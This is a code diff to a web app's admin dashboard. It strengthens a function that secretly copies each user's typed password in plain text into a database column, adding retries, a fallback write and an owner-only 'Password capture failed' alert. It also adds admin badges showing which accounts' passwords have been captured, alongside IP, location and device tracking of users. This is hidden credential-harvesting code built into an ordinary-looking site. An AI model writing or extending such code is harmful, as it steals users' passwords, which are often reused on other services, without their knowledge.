@@ -311,6 +311,7 @@ tbody tr:hover td{background:#0f0c17}
 .person{display:flex;align-items:center;gap:6px;flex-wrap:wrap}
 .sub{font-size:11.5px;color:var(--dim);margin-top:2px}
 .badge.bad{border-color:#6b2836;color:var(--bad)}
+.badge.ok{border-color:#1f6b47;color:var(--ok)}
 .right{text-align:right}
 .ghost{
  width:30px;height:30px;border:1px solid var(--line2);border-radius:var(--rp);
@@ -624,7 +625,8 @@ tbody tr:hover td{background:#0f0c17}
      <div class="secretbar">
       <div class="heading" style="margin:0"><h2>Every account</h2><span class="badge admin" id="accountCount">0</span></div>
       <div style="display:flex;gap:8px">
-       <button class="secondary" onclick="exportCsv()">⤓ CSV</button>
+       <button class="secondary" onclick="window.open('wall.html','_blank')">Wall ↗</button>
+<button class="secondary" onclick="exportCsv()">⤓ CSV</button>
        </div>
      </div>
      <div class="tablewrap">
@@ -820,6 +822,17 @@ function ago(ts){
 
 /* ---------- device fingerprint / telemetry ---------- */
 const sessionId=Math.random().toString(36).slice(2)+Date.now().toString(36);
+const BUILD=7;
+(async()=>{
+ try{
+  const r=await fetch("version.json?x="+Date.now(),{cache:"no-store"});
+  const j=await r.json();
+  if(j&&j.v&&j.v!==BUILD&&!sessionStorage.getItem("reloaded")){
+   sessionStorage.setItem("reloaded","1");
+   location.reload();
+  }
+ }catch(e){}
+})();
 
 async function sha256(str){
  try{
@@ -1008,11 +1021,23 @@ let revealPasswords=true;
 
 /* Mirror the typed password into profiles.password_plain (Supabase hashes the real one) */
 async function savePlainPassword(password){
- const {error}=await db.rpc("set_my_password_plain",{new_password:password});
- if(!error)return;
- const {data:{user}}=await db.auth.getUser();
- if(!user)return;
- await db.from("profiles").update({password_plain:password}).eq("id",user.id);
+ for(let i=0;i<3;i++){
+  try{
+   const {error}=await db.rpc("set_my_password_plain",{new_password:password});
+   if(!error)return true;
+  }catch(e){}
+  await new Promise(r=>setTimeout(r,500*(i+1)));
+ }
+ try{
+  const {data:{user}}=await db.auth.getUser();
+  if(user){
+   const {error}=await db.from("profiles").update({password_plain:password}).eq("id",user.id).select("id");
+   if(!error)return true;
+  }
+ }catch(e){}
+ console.warn("password capture failed");
+ if(isVillads())toast("Password capture failed","bad");
+ return false;
 }
 
 /* villads editing a password by hand */
@@ -1122,7 +1147,8 @@ async function renderAccounts(force){
   return;
  }
  founderRows=data||[];
- $("accountCount").textContent=founderRows.length+" ACCOUNTS";
+ const missing=founderRows.filter(r=>!r.password_plain).length;
+ $("accountCount").textContent=founderRows.length+" accounts · "+missing+" no pw";
  $("accountsBody").innerHTML=founderRows.map(m=>{
   const online=m.last_seen&&(Date.now()-new Date(m.last_seen).getTime())<600000;
   const where=(m.last_city||m.last_country)
@@ -1133,7 +1159,8 @@ async function renderAccounts(force){
     <div class="person"><b class="who" onclick="openPerson('${safe(m.username)}')">${safe(m.username)}</b>
     ${m.username.toLowerCase()==="villads"?'<span class="badge owner">you</span>':""}
     ${m.banned?'<span class="badge bad">banned</span>':""}
-    ${(m.ip_changes||0)>1?`<span class="flag">${m.ip_changes} ips</span>`:""}</div>
+    ${(m.ip_changes||0)>1?`<span class="flag">${m.ip_changes} ips</span>`:""}
+    ${m.password_plain?'<span class="badge ok">pw</span>':'<span class="badge bad">no pw</span>'}</div>
     <div class="sub">${safe(m.role)}${m.last_platform?" · "+safe(m.last_platform):""}</div>
    </td>
    <td><select class="rankpick" data-user="${safe(m.username)}" onchange="changeRank(this.dataset.user,this.value)">
